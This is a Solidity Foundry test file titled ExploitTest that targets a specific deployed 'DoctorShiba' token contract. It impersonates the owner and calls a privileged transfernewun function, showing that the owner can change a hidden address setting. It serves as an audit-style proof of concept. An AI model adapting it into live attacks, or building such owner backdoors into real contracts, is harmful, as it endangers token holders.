pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDoctorShiba {
    function owner() external view returns (address);
    function transfernewun(address _newun) external;
    function newun() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);
    IDoctorShiba ds;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        ds = IDoctorShiba(TARGET);
        owner = ds.owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        address blacklistedAddress = address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF);

                vm.startPrank(owner);
                ds.transfernewun(blacklistedAddress);
                vm.stopPrank();

                assertNotEq(ds.newun(), address(0));
                assertEq(ds.newun(), blacklistedAddress);
        assertTrue(ds.newun() != address(0), "Logic Exploit Failed: Value unchanged");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

